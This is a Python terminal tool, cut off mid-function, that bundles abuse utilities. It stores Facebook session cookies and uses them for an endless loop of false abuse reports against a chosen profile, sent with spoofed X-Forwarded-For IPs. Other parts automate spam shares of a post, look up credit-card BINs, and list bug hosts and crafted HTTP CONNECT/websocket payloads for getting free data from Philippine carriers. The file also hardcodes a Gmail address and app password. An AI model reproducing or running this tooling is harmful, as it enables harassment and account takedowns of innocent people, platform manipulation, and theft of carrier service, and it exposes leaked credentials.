#!/usr/bin/env python3
# ============================================
# SAEKAX TOOL v1.0 — COMPLETE ALL-IN-ONE
# Created by Saeka Tojirp
# GitHub: github.com/saekacutie/sakea
# ============================================

import re, os, sys, time, shutil, subprocess, importlib, json, sqlite3, hashlib, random, socket, ssl, smtplib, ipaddress, threading, requests
from datetime import datetime
from pathlib import Path
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# ── AUTO-SETUP ────────────────────────────
def auto_setup():
    packages = {"requests": "requests", "bs4": "beautifulsoup4", "colorama": "colorama", "playwright": "playwright"}
    for mod, pkg in packages.items():
        try:
            importlib.import_module(mod)
        except ImportError:
            subprocess.run([sys.executable, "-m", "pip", "install", pkg], capture_output=True)
    try:
        from playwright.sync_api import sync_playwright
    except:
        subprocess.run([sys.executable, "-m", "playwright", "install", "chromium"], capture_output=True)
auto_setup()
from bs4 import BeautifulSoup

# ── CONFIG ────────────────────────────────
try:
    sys.path.append(os.path.join(os.path.dirname(__file__), 'config'))
    import settings
    GMAIL_USER = settings.GMAIL_USER
    GMAIL_APP_PASS = settings.GMAIL_APP_PASS
    DB_FILE = settings.DB_FILE
    CREATOR_FB = settings.CREATOR_FACEBOOK
    CREATOR_MSG = settings.CREATOR_MESSENGER
    BIN_API = settings.BIN_API_URL
except:
    GMAIL_USER = "bidosijanjan@gmail.com"
    GMAIL_APP_PASS = "xkfu xnin jift cxax"
    DB_FILE = "data/users.db"
    CREATOR_FB = "Facebook.com/saekacutiee"
    CREATOR_MSG = "m.me/saekacutiee"
    BIN_API = "https://lookup.binlist.net/{}"

# ── CONSTANTS ─────────────────────────────
R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
M = '\033[95m'; C = '\033[96m'; W = '\033[97m'
BOLD = '\033[1m'; DIM = '\033[2m'; RES = '\033[0m'

def tw(): return shutil.get_terminal_size().columns if hasattr(shutil, 'get_terminal_size') else 60

# ── DATABASE SETUP ─────────────────────────
def init_db():
    Path(os.path.dirname(DB_FILE)).mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT NOT NULL UNIQUE,
        password TEXT NOT NULL,
        verified INTEGER DEFAULT 0,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS fb_accounts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT NOT NULL,
        cookie TEXT NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    conn.commit()
    conn.close()

def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

def register_user(email, password):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    try:
        c.execute("INSERT INTO users (email, password) VALUES (?, ?)", (email, hash_password(password)))
        conn.commit()
        return True
    except sqlite3.IntegrityError:
        return False
    finally:
        conn.close()

def verify_user(email, password):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE email=? AND password=? AND verified=1", (email, hash_password(password)))
    result = c.fetchone()
    conn.close()
    return result is not None

def set_verified(email):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET verified=1 WHERE email=?", (email,))
    conn.commit()
    conn.close()

def save_fb_account(name, cookie):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO fb_accounts (name, cookie) VALUES (?, ?)", (name, cookie))
    conn.commit()
    conn.close()

def get_all_fb_accounts():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id, name, cookie FROM fb_accounts")
    rows = c.fetchall()
    conn.close()
    return [{"id": r[0], "name": r[1], "cookie": r[2]} for r in rows]

# ── EMAIL ──────────────────────────────────
def send_verification_code(email, code):
    try:
        msg = MIMEMultipart()
        msg['From'] = GMAIL_USER
        msg['To'] = email
        msg['Subject'] = "Your Verification Code - SAEKAX TOOL"
        username = email.split('@')[0]
        body = f"""Hi {username},

Thank you for signing up! Use the code below to complete your verification.

Verification Code: {code}

If you did not request this, please ignore this email.

Thank you,
Saeka Tojirp"""
        msg.attach(MIMEText(body, 'plain'))
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(GMAIL_USER, GMAIL_APP_PASS)
        server.send_message(msg)
        server.quit()
        return True
    except:
        return False

# ── ANIMATIONS ────────────────────────────
def spinner(text="Loading", sec=1.2):
    frames = ['◜', '◠', '◝', '◞', '◡', '◟']
    end = time.time() + sec; i = 0
    while time.time() < end:
        sys.stdout.write(f"\r  {C}{frames[i%6]} {RES}{text}...")
        sys.stdout.flush(); time.sleep(0.08); i += 1
    sys.stdout.write("\r" + " " * 50 + "\r")

def centered_spinner(text, duration):
    frames = ['◜', '◠', '◝', '◞', '◡', '◟']
    h = shutil.get_terminal_size().lines
    end = time.time() + duration; i = 0
    while time.time() < end:
        os.system('clear')
        print("\n" * (h // 2 - 2))
        print(f"{C}{BOLD}{frames[i%6].center(tw())}{RES}")
        print(f"{W}{BOLD}{text.center(tw())}{RES}")
        time.sleep(0.1); i += 1

def center_text(text, width=None, ansi_aware=False):
    """
    Return the text centered within *width* columns.
    If *ansi_aware* is True, strip ANSI escape codes before measuring length,
    then re‑insert them for the final output.
    """
    if width is None:
        width = shutil.get_terminal_size().columns

    if ansi_aware:
        # strip ANSI codes for length calculation
        plain = re.sub(r'\x1b\[[0-9;]*m', '', text)
        pad = (width - len(plain)) // 2
        if pad < 0:
            pad = 0
        return " " * pad + text
    else:
        pad = (width - len(text)) // 2
        if pad < 0:
            pad = 0
        return " " * pad + text

def process_spinner(text, stop_event):
    frames = ['◜', '◠', '◝', '◞', '◡', '◟']; i = 0
    while not stop_event.is_set():
        sys.stdout.write(f"\r  {C}{frames[i%6]} {RES}{text}...")
        sys.stdout.flush(); time.sleep(0.08); i += 1

def check_animation(text2, duration=2):
    os.system('clear')
    h = shutil.get_terminal_size().lines
    print("\n" * (h // 2 - 2))
    print(f"{G}{BOLD}{'✓'.center(tw())}{RES}")
    print(f"{G}{BOLD}{text2.center(tw())}{RES}")
    time.sleep(duration)

def banner(username=""):
    os.system('clear')
    title_lines = [
        "███████╗ █████╗ ███████╗██╗  ██╗ █████╗ ██╗  ██╗",
        "██╔════╝██╔══██╗██╔════╝██║ ██╔╝██╔══██╗╚██╗██╔╝",
        "███████╗███████║█████╗  █████╔╝ ███████║ ╚███╔╝ ",
        "╚════██║██╔══██║██╔══╝  ██╔═██╗ ██╔══██║ ██╔██╗ ",
        "███████║██║  ██║███████╗██║  ██╗██║  ██║██╔╝ ██╗",
        "╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝",
    ]
    colors = [R, G, B, M, C, Y]
    for i, line in enumerate(title_lines):
        color = colors[i % len(colors)]
        print(f"{BOLD}{color}{line}{RES}")
        time.sleep(0.05)
    print(f"\n{DIM}Created by Saeka Tojirp{RES}")
    if username:
        print(f"{C}{BOLD}Hi! {username}{RES}")
    print()

# ── LOADING SCREEN ────────────────────────
def loading_screen():
    """
    Fixed loading screen — no flashing, no artifacts, properly centered.
    """
    # Check for missing packages
    missing = []
    for mod in ["requests", "bs4", "colorama"]:
        try:
            importlib.import_module(mod)
        except ImportError:
            missing.append(mod)

    duration = 60 if missing else 10

    # Install missing packages silently
    if missing:
        for pkg in missing:
            subprocess.run(
                [sys.executable, "-m", "pip", "install", pkg],
                capture_output=True,
                timeout=30
            )

    greetings = [
        "Welcome!",
        "Bienvenido!",
        "Bienvenue!",
        "Willkommen!",
        "Benvenuto!",
        "Yokoso!",
        "Hwan-yeonghabnida!",
        "Maligayang Pagdating!",
    ]

    frames = ['|', '/', '-', '\\']
    start = time.time()
    greet_idx = 0
    last_greet = start

    while time.time() - start < duration:
        # Get terminal size every frame
        w = shutil.get_terminal_size().columns
        h = shutil.get_terminal_size().lines

        # Current frame and greeting
        frame = frames[int((time.time() - start) * 6) % 4]
        if time.time() - last_greet >= 5:
            greet_idx = (greet_idx + 1) % len(greetings)
            last_greet = time.time()
        greet = greetings[greet_idx]

        # Build the screen in memory, then print all at once
        lines = []

        # Top padding (center vertically for 3 rows: frame / blank / greeting)
        top = (h - 3) // 2
        if top < 0:
            top = 0
        for _ in range(top):
            lines.append("")

        # Spinner line (centered)
        spinner_line = frame.center(w)
        lines.append(spinner_line)

        # Blank line
        lines.append("")

        # Greeting line (centered)
        greet_line = greet.center(w)
        lines.append(greet_line)

        # Fill the rest of the screen with blank lines
        remaining = h - len(lines)
        for _ in range(remaining):
            lines.append("")

        # Print everything in one shot — no flicker
        sys.stdout.write("\033[H" + "\n".join(lines))
        sys.stdout.flush()

        time.sleep(0.12)

    # Clean exit
    sys.stdout.write("\033[2J\033[H")
    sys.stdout.flush()
    
# ── ARROW MENU ────────────────────────────
def arrow_menu(options, username=""):
    selected = 0
    while True:
        os.system('clear')
        banner(username)
        for i, option in enumerate(options):
            if i == selected:
                print(f"  {G}{BOLD}▸ {option}{RES}")
            else:
                print(f"  {DIM}  {option}{RES}")
        key = get_key()
        if key == 'UP' and selected > 0:
            selected -= 1
        elif key == 'DOWN' and selected < len(options) - 1:
            selected += 1
        elif key == 'ENTER':
            return selected + 1

def get_key():
    import tty, termios
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    try:
        tty.setraw(fd)
        ch = sys.stdin.read(1)
        if ch == '\x1b':
            ch2 = sys.stdin.read(2)
            if ch2 == '[A': return 'UP'
            elif ch2 == '[B': return 'DOWN'
        elif ch == '\r': return 'ENTER'
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)
    return None

# ── SIGNUP ─────────────────────────────────
def signup():
    os.system('clear')
    banner()
    email = input(f"  {W}Email: {RES}").strip()
    if not email:
        return  # return to auth screen

    password = input(f"  {W}Password: {RES}").strip()
    if len(password) < 6:
        os.system('clear')
        banner()
        print(f"  {R}Password must be at least 6 characters.{RES}")
        time.sleep(2)
        return  # return to auth screen

    if not register_user(email, password):
        os.system('clear')
        banner()
        print(f"  {R}Email already registered.{RES}")
        time.sleep(2)
        return  # return to auth screen

    code = str(random.randint(100000, 999999))
    stop_event = threading.Event()
    t = threading.Thread(target=lambda: process_spinner("Sending verification code to your Gmail account...", stop_event))
    t.start()
    sent = send_verification_code(email, code)
    stop_event.set()
    t.join()

    if not sent:
        os.system('clear')
        banner()
        print(f"  {R}Failed to send email. Check Gmail SMTP settings.{RES}")
        time.sleep(2)
        return  # return to auth screen

    os.system('clear')
    banner()
    print(f"  {W}Email: {email}{RES}")
    print(f"  {W}Password: {'*' * len(password)}{RES}")
    print(f"  {G}✓ Verification code sent to {email}{RES}")
    time.sleep(2)

    # Code retry loop — stays here until correct or user gives up
    for attempt in range(5):
        os.system('clear')
        banner()
        print(f"  {W}Email: {email}{RES}")
        print(f"  {W}Password: {'*' * len(password)}{RES}")
        if attempt > 0:
            print(f"  {Y}Incorrect code. {5 - attempt} attempts remaining.{RES}")
        print(f"\n  {DIM}Type 'back' to return to main screen.{RES}")
        user_code = input(f"  {W}Enter code: {RES}").strip()

        if user_code == code:
            set_verified(email)
            centered_spinner("Verification is in Process. Please do not Close this Terminal.", 10)
            check_animation("VERIFICATION SUCCESSFUL!", 2)
            main_menu(email)
            return

        if user_code.lower() == 'back':
            return  # return to auth screen

        if user_code.lower() == 'resend':
            code = str(random.randint(100000, 999999))
            stop_event = threading.Event()
            t = threading.Thread(target=lambda: process_spinner("Resending code...", stop_event))
            t.start()
            sent = send_verification_code(email, code)
            stop_event.set()
            t.join()
            if sent:
                print(f"  {G}✓ New code sent.{RES}")
                time.sleep(1)
            else:
                print(f"  {R}Failed to resend.{RES}")
                time.sleep(1)
            continue

    # After 5 failed attempts — return to auth screen
    os.system('clear')
    banner()
    print(f"  {R}Too many incorrect attempts. Returning to main screen.{RES}")
    time.sleep(2)
    # returns to auth screen


def login():
    os.system('clear')
    banner()
    email = input(f"  {W}Email: {RES}").strip()
    if not email:
        return  # return to auth screen

    for attempt in range(3):
        if attempt > 0:
            os.system('clear')
            banner()
            print(f"  {W}Email: {email}{RES}")
            print(f"  {Y}Incorrect password. {3 - attempt} attempts remaining.{RES}")

        password = input(f"  {W}Password: {RES}").strip()
        if not password:
            continue

        stop_event = threading.Event()
        t = threading.Thread(target=lambda: process_spinner("CHECKING IF ACCOUNT IS ACTIVE...", stop_event))
        t.start()
        valid = verify_user(email, password)
        stop_event.set()
        t.join()

        if valid:
            check_animation("VERIFICATION SUCCESSFUL!", 2)
            main_menu(email)
            return  # success — stays in main menu

    # After 3 failed attempts — return to auth screen
    os.system('clear')
    banner()
    print(f"  {R}Too many failed attempts. Returning to main screen.{RES}")
    time.sleep(2)
    # returns to auth screen

# ── MAIN MENU ─────────────────────────────
def main_menu(username=""):
    options = [
        "FACEBOOK SPAM SHARE",
        "FACEBOOK SPAM REPORTER",
        "SAVE FACEBOOK ACCOUNT",
        "HTTP TOOLS",
        "CC BIN INFO",
        "FREENET PH METHODS",
        "ONLINE TEMPNUMBER",
        "SENT SMS ONLINE",
        "TEMPMAIL",
        "UPDATE SAEKAX TOOL",
        "CREDITS",
        "END SESSION",
    ]
    while True:
        choice = arrow_menu(options, username)
        if choice == 1: facebook_spam_share()
        elif choice == 2: facebook_spam_reporter()
        elif choice == 3: save_fb_menu()
        elif choice == 4: http_tools()
        elif choice == 5: cc_bin_info()
        elif choice == 6: freenet_main()
        elif choice == 7: sms_ph_main()
        elif choice == 8: send_sms_main()
        elif choice == 9: tempmail_main()
        elif choice == 10: update_tool()
        elif choice == 11: credits()
        elif choice == 12: end_session()

# ── SAVE FB ACCOUNT ────────────────────
def save_fb_menu():
    os.system('clear')
    banner()
    print(f"  {W}SAVE FACEBOOK ACCOUNT{RES}\n")
    name = input(f"  {W}Account Name: {RES}").strip()
    if not name: return
    print(f"\n  {DIM}Paste your Facebook cookie from browser DevTools:{RES}")
    print(f"  {DIM}Example: c_user=123456; xs=abc123def{RES}")
    cookie = input(f"  {W}Cookie: {RES}").strip()
    if not cookie: return
    save_fb_account(name, cookie)
    print(f"\n  {G}[OK] Account saved: {name}{RES}")
    time.sleep(1.5)

# ── FACEBOOK SPAM REPORTER ──────────────
def facebook_spam_reporter():
    os.system('clear')
    banner()
    accounts = get_all_fb_accounts()
    if not accounts:
        print(f"  {R}No Facebook accounts saved.{RES}")
        print(f"  {DIM}Use SAVE FACEBOOK ACCOUNT first.{RES}")
        input(f"\n  {DIM}Press ENTER to continue...{RES}"); return
    print(f"  {W}Select account:{RES}")
    for i, acc in enumerate(accounts):
        print(f"  {G}[{i+1}]{RES} {acc['name']}")
    print(f"  {G}[0]{RES} Back")
    try:
        choice = int(input(f"\n  {W}Choice: {RES}"))
        if choice == 0: return
        selected = accounts[choice - 1]
    except: return
    link = input(f"  {W}ENTER ACCOUNT PROFILE LINK: {RES}").strip()
    if not link: return
    user_id = None
    try:
        r = requests.get(link, headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
        match = re.search(r'"userID":"(\d+)"', r.text)
        if match: user_id = match.group(1)
        else:
            match = re.search(r'entity_id=(\d+)', r.text)
            if match: user_id = match.group(1)
    except: pass
    if not user_id:
        print(f"  {R}Could not extract profile ID.{RES}")
        input(f"\n  {DIM}Press ENTER to continue...{RES}"); return
    print(f"\n  {G}Target ID: {user_id}{RES}")
    print(f"  {Y}Starting report loop...{RES}\n")
    cookie = selected['cookie']
    categories = ["impersonation", "harassment", "spam", "fake_account"]
    count = 0
    while True:
        fake_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
        headers = {
            "User-Agent": random.choice(["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"]),
            "Cookie": cookie,
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Forwarded-For": fake_ip
        }
        cat = random.choice(categories)
        count += 1
        try:
            r = requests.post("https://www.facebook.com/ajax/report/social.php", headers=headers, data={"report_type": cat, "content_owner_id_new": user_id, "reportable_ent_token": user_id}, timeout=10)
            status = "SUCCESS" if r.status_code == 200 else "FAILED"
            color = G if r.status_code == 200 else R
            print(f"  [{color}{count}{RES}] [{fake_ip}] [{status}] {cat}")
        except:
            print(f"  [{R}{count}{RES}] [{fake_ip}] Connection error")
        time.sleep(random.uniform(1, 4))

# ── FACEBOOK SPAM SHARE ──────────────────
def facebook_spam_share():
    os.system('clear')
    banner()
    accounts = get_all_fb_accounts()
    if not accounts:
        print(f"  {R}No Facebook accounts saved.{RES}")
        print(f"  {DIM}Use SAVE FACEBOOK ACCOUNT first.{RES}")
        input(f"\n  {DIM}Press ENTER to continue...{RES}"); return
    print(f"  {W}Select account:{RES}")
    for i, acc in enumerate(accounts):
        print(f"  {G}[{i+1}]{RES} {acc['name']}")
    print(f"  {G}[0]{RES} Back")
    try:
        choice = int(input(f"\n  {W}Choice: {RES}"))
        if choice == 0: return
        selected = accounts[choice - 1]
    except: return
    link = input(f"  {W}ENTER POST LINK: {RES}").strip()
    if not link: return
    duration = input(f"  {W}SPAM SHARE DURATION (sec/min/hour): {RES}").strip()
    rate = int(input(f"  {W}Shares per second: {RES}") or "1")
    safe = input(f"  {W}ENABLE SAFE MODE (on/off): {RES}").strip().lower() == "on"
    dur_sec = 60
    if "min" in duration: dur_sec = int(duration.replace("min","")) * 60
    elif "hour" in duration: dur_sec = int(duration.replace("hour","")) * 3600
    elif duration.isdigit(): dur_sec = int(duration)
    post_id = None
    try:
        match = re.search(r'posts/(\d+)', link)
        if match: post_id = match.group(1)
        else:
            match = re.search(r'story_fbid=(\d+)', link)
            if match: post_id = match.group(1)
    except: pass
    if not post_id:
        print(f"  {R}Could not extract post ID.{RES}")
        input(f"\n  {DIM}Press ENTER to continue...{RES}"); return
    print(f"\n  {G}Post ID: {post_id}{RES}\n  {Y}Starting share loop...{RES}\n")
    cookie = selected['cookie']
    count = 0
    start_time = time.time()
    while time.time() - start_time < dur_sec:
        try:
            r = requests.post("https://www.facebook.com/ajax/share/dialog", headers={"User-Agent": "Mozilla/5.0", "Cookie": cookie, "Content-Type": "application/x-www-form-urlencoded"}, data={"shareable_id": post_id, "nctr[_mod]": "pagelet_composer"}, timeout=10)
            if r.status_code == 200:
                count += 1
                print(f"  [{G}✓{RES}] Shared ({count})")
            else:
                print(f"  [{R}✗{RES}] Failed (HTTP {r.status_code})")
        except:
            print(f"  [{R}✗{RES}] Connection error")
        if safe: time.sleep(random.uniform(3, 8))
        else: time.sleep(1 / rate)
    print(f"\n  {G}[DONE]{RES} Total shares: {count}")
    input(f"\n  {DIM}Press ENTER to continue...{RES}")

# ── HTTP TOOLS ──────────────────────────
def http_tools():
    os.system('clear')
    banner()
    url = input(f"  {W}ENTER SITE URL: {RES}").strip()
    if not url: return
    centered_spinner("SCANNING SITE...", 2)
    try:
        if not url.startswith('http'): url = 'https://' + url
        r = requests.get(url, timeout=10)
        hostname = url.replace("https://","").replace("http://","").split("/")[0]
        ip = socket.gethostbyname(hostname)
        os.system('clear'); banner()
        print(f"  {G}HTTP REPORT:{RES}\n  URL: {url}\n  Resolved IP: {ip}\n  Status: {r.status_code}\n  Server: {r.headers.get('Server','N/A')}\n  CDN: {'Cloudflare' if 'cloudflare' in str(r.headers).lower() else 'None'}")
    except:
        print(f"  {R}Site not reachable.{RES}")
    input(f"\n  {DIM}Press ENTER to continue...{RES}")

# ── CC BIN INFO ─────────────────────────
def cc_bin_info():
    os.system('clear')
    banner()
    bin_num = input(f"  {W}ENTER BIN (First 6 digits): {RES}").strip()
    if not bin_num: return
    spinner("Looking up BIN", 1)
    try:
        r = requests.get(BIN_API.format(bin_num[:6]), headers={"Accept": "application/json"})
        if r.status_code == 200:
            data = r.json()
            country = data.get('country',{})
            bank = data.get('bank',{})
            if not country.get('name') and not data.get('brand'):
                print(f"  {R}BIN Not Found.{RES}")
                input(f"\n  {DIM}Press ENTER to continue...{RES}"); return
            os.system('clear'); banner()
            print(f"  {G}BIN Found: {bin_num[:6]}{RES}\n  {DIM}{'─'*50}{RES}\n  Country: {country.get('name','N/A')} {country.get('emoji','')}\n  Bank: {bank.get('name','N/A')}\n  Brand: {data.get('brand','N/A')}\n  Type: {data.get('type','N/A')}\n  Currency: {country.get('currency','N/A')}\n  {DIM}{'─'*50}{RES}")
        else:
            print(f"  {R}BIN Not Found.{RES}")
    except:
        print(f"  {R}Connection error.{RES}")
    input(f"\n  {DIM}Press ENTER to continue...{RES}")

# ── FREENET PH METHODS ─────────────────────
FREENET_BUGBOSTS = {
    "STS": {  # Smart / TNT / Sun
        "name": "Smart/TNT/Sun",
        "hosts": [
            "smart.com.ph", "m.smart.com.ph", "tnt.ph", "sun.com.ph",
            "gigalife.smart.com.ph", "my.smart.com.ph", "smartbro.net",
            "connectivitycheck.gstatic.com", "clients3.google.com",
            "l.google.com", "mtalk.google.com", "gstatic.com",
            "0.freebasics.com", "freebasics.com", "internet.org",
            "facebook.com", "m.facebook.com", "fbcdn.net",
            "cdnjs.cloudflare.com", "workers.dev", "pages.dev",
            "cloudflare.com", "speedtest.net", "github.com",
            "shopee.ph", "lazada.com.ph",
            "spotify.com", "netflix.com", "nflxvideo.net",
        ],
        "payload_templates": [
            "CONNECT [host]:[port] HTTP/1.1\r\nHost: [sni]\r\nConnection: Keep-Alive\r\n\r\n",
            "GET / HTTP/1.1\r\nHost: [sni]\r\nUser-Agent: Mozilla/5.0\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n",
            "GET / HTTP/1.1\r\nHost: [sni]\r\nX-Forwarded-Host: [sni]\r\nX-Forwarded-For: [sni]\r\n\r\n",
            "GET http://[host]:[port]/ HTTP/1.1\r\nHost: [sni]\r\nConnection: Keep-Alive\r\n\r\n",
            "HEAD / HTTP/1.1\r\nHost: [sni]\r\nConnection: Keep-Alive\r\n\r\n",
        ],
    },
    "GTM": {  # Globe / TM
        "name": "Globe/TM",
        "hosts": [
            "globe.com.ph", "m.globe.com.ph", "tm.com.ph",
            "gcash.com", "mygcash.com", "globelines.com.ph",
            "connectivitycheck.gstatic.com", "clients3.google.com",
            "l.google.com", "mtalk.google.com", "gstatic.com",
            "0.freebasics.com", "freebasics.com", "internet.org",
            "facebook.com", "m.facebook.com", "fbcdn.net",
            "cdnjs.cloudflare.com", "workers.dev", "pages.dev",
            "cloudflare.com", "speedtest.net", "github.com",
            "shopee.ph", "lazada.com.ph",
            "spotify.com", "netflix.com", "nflxvideo.net",
        ],
        "payload_templates": [
            "CONNECT [host]:[port] HTTP/1.1\r\nHost: [sni]\r\nConnection: Keep-Alive\r\n\r\n",
            "GET / HTTP/1.1\r\nHost: [sni]\r\nUser-Agent: Mozilla/5.0\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n",
            "GET / HTTP/1.1\r\nHost: [sni]\r\nX-Forwarded-Host: [sni]\r\nX-Forwarded-For: [sni]\r\n\r\n",
            "GET http://[host]:[port]/ HTTP/1.1\r\nHost: [sni]\r\nConnection: Keep-Alive\r\n\r\n",
            "HEAD / HTTP/1.1\r\nHost: [sni]\r\nConnection: Keep-Alive\r\n\r\n",
        ],
    },
    "DITO": {
        "name": "DITO Telecommunity",
        "hosts": [
            "dito.ph", "business.dito.ph", "my.dito.ph", "galing.dito.ph",
            "connectivitycheck.gstatic.com", "clients3.google.com",
            "l.google.com", "mtalk.google.com", "gstatic.com",
            "0.freebasics.com", "freebasics.com", "internet.org",
            "facebook.com", "m.facebook.com", "fbcdn.net",
            "cdnjs.cloudflare.com", "workers.dev", "pages.dev",
            "cloudflare.com", "speedtest.net", "github.com",
        ],
        "payload_templates": [
            "CONNECT [host]:[port] HTTP/1.1\r\nHost: [sni]\r\nConnection: Keep-Alive\r\n\r\n",
            "GET / HTTP/1.1\r\nHost: [sni]\r\nUser-Agent: Mozilla/5.0\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n",
            "GET / HTTP/1.1\r\nHost: [sni]\r\nX-Forwarded-Host: [sni]\r\nX-Forwarded-For: [sni]\r\n\r\n",
            "GET http://[host]:[port]/ HTTP/1.1\r\nHost: [sni]\r\nConnection: Keep-Alive\r\n\r\n",
            "HEAD / HTTP/1.1\r\nHost: [sni]\r\nConnection: Keep-Alive\r\n\r\n",
        ],
    },
}

# Common SSH providers for freenet
FREENET_SSH_PROVIDERS = [
    {"name": "SSHOcean", "url": "sshocean.com"},
    {"name": "FastSSH", "url": "fastssh.com"},
    {"name": "SSHKit", "url": "sshkit.com"},
    {"name": "TunnelSSH", "url": "tunnelssh.com"},
    {"name": "SSHStores", "url": "sshstores.net"},
]

# CloudFront/Google IP ranges for host scanning
CLOUDFRONT_RANGES = [
    "13.249.0.0/16", "54.192.0.0/16", "54.230.0.0/17", "54.239.128.0/18",
    "52.84.0.0/15", "52.222.0.0/17", "3.160.0.0/15",
]

GOOGLE_RANGES = [
    "34.64.0.0/11", "34.96.0.0/12", "35.184.0.0/13", "35.224.0.0/12",
    "130.211.0.0/16", "142.250.0.0/15",
]

def freenet_main():
    """Main entry point for FREENET PH METHODS"""
    options = [
        "STS (Smart/TNT/Sun) Methods",
        "GTM (Globe/TM) Methods",
        "DITO Methods",
        "Bug Host Scanner",
        "Generate VPN Config",
        "SSH Account Providers",
        "Back to Main Menu",
    ]
    selected = 0
    while True:
        os.system('clear')
        banner()
        print(f"  {Y}{BOLD}FREENET PH METHODS{RES}\n")
        for i, option in enumerate(options):
            if i == selected:
                print(f"  {G}{BOLD}▸ {option}{RES}")
            else:
                print(f"  {DIM}  {option}{RES}")
        key = get_key()
        if key == 'UP' and selected > 0:
            selected -= 1
        elif key == 'DOWN' and selected < len(options) - 1:
            selected += 1
        elif key == 'ENTER':
            if selected == 0: freenet_network_menu("STS")
            elif selected == 1: freenet_network_menu("GTM")
            elif selected == 2: freenet_network_menu("DITO")
            elif selected == 3: bug_host_scanner()
            elif selected == 4: generate_vpn_config()
            elif selected == 5: ssh_providers()
            elif selected == 6: return

def freenet_network_menu(network):
    """Show bughosts and payloads for a specific network"""
    data = FREENET_BUGBOSTS[network]
    while True:
        os.system('clear')
        banner()
        print(f"  {Y}{BOLD}{data['name']} - Bug Hosts & Payloads{RES}\n")
        print(f"  {G}[1]{RES} View Working Bug Hosts")
        print(f"  {G}[2]{RES} View Payload Templates")
        print(f"  {G}[3]{RES} Test a Bug Host")
        print(f"  {G}[4]{RES} Generate Config for HTTP Custom")
        print(f"  {G}[5]{RES} Copy Payload to Clipboard")
        print(f"  {G}[0]{RES} Back\n")
        choice = input(f"  {W}Choice: {RES}").strip()
        if choice == "1":
            os.system('clear'); banner()
            print(f"  {Y}{BOLD}{data['name']} Bug Hosts{RES}\n")
            for i, host in enumerate(data['hosts']):
                print(f"  {G}[{i+1:02d}]{RES} {host}")
            input(f"\n  {DIM}Press ENTER to continue...{RES}")
        elif choice == "2":
            os.system('clear'); banner()
            print(f"  {Y}{BOLD}{data['name']} Payload Templates{RES}\n")
            for i, payload in enumerate(data['payload_templates']):
                print(f"  {G}[{i+1}]{RES} {payload[:80]}...")
            input(f"\n  {DIM}Press ENTER to continue...{RES}")
        elif choice == "3":
            os.system('clear'); banner()
            print(f"  {W}Available Bug Hosts for {data['name']}:{RES}")
            for i, host in enumerate(data['hosts'][:15]):
                print(f"  {G}[{i+1:02d}]{RES} {host}")
            print(f"  {G}[E]{RES} Enter custom host")
            try:
                ch = input(f"\n  {W}Select host: {RES}").strip()
                target = None
                if ch.upper() == "E":
                    target = input(f"  {W}Enter host: {RES}").strip()
                elif ch.isdigit() and 1 <= int(ch) <= 15:
                    target = data['hosts'][int(ch) - 1]
                if target:
                    test_bughost(target)
            except: pass
        elif choice == "4":
            generate_config_for_network(network)
        elif choice == "5":
            os.system('clear'); banner()
            print(f"  {W}Select payload to copy:{RES}")
            for i, payload in enumerate(data['payload_templates']):
                print(f"  {G}[{i+1}]{RES} {payload[:60]}...")
            try:
                c = int(input(f"\n  {W}Choice: {RES}").strip())
                if 1 <= c <= len(data['payload_templates']):
                    os.system(f'echo "{data["payload_templates"][c-1]}" | termux-clipboard-set 2>/dev/null')
                    print(f"  {G}[OK] Payload copied!{RES}")
                    time.sleep(1)
            except: pass
        elif choice == "0": return

def test_bughost(host):
    """Test a bughost for connectivity and SNI response"""
    os.system('clear'); banner()
    print(f"  {Y}Testing: {host}{RES}\n")
    spinner("Testing port 443", 1)
    try:
        # Test resolution
        ip = socket.gethostbyname(host)
        print(f"  {G}[✓]{RES} Resolved: {ip}")
        # Test TCP
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        if sock.connect_ex((host, 443)) == 0:
            print(f"  {G}[✓]{RES} Port 443: OPEN")
        else:
            print(f"  {R}[✗]{RES} Port 443: CLOSED")
        sock.close()
        # Test SNI
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((host, 443), timeout=5) as s:
                with ctx.wrap_socket(s, server_hostname=host) as ss:
                    cert = ss.getpeercert()
                    if cert:
                        from datetime import datetime
                        not_after = datetime.strptime(cert.get('notAfter', '20000101000000Z'), "%b %d %H:%M:%S %Y %Z")
                        subject = dict(x[0] for x in cert.get('subject', []))
                        cn = subject.get('commonName', 'N/A')
                        remaining = (not_after - datetime.utcnow()).days
                        print(f"  {G}[✓]{RES} TLS: VALID | CN: {cn} | Exp: {remaining} days")
        except Exception as e:
